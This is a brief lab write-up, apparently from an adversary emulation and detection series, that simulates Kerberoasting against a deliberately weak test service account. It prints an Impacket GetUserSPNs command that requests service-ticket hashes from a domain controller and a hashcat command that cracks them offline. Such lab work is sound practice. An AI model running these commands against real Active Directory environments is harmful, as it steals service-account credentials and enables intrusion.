# Adversarial Emulation & Detection Phase 4 : Credential Harvesting (kerboroasting)

Simulated a Kerberoasting attack from a domain-joined Kali attacker against a deliberately vulnerable service account (`svc_sql`) with a weak password (T1558.003).
## Execution:
``` cmd
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  domain.ad/client:'<password>' \
  -dc-ip 192.168.100.20 \
  -request \
  -outputfile hashes.kerberoast

  hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```
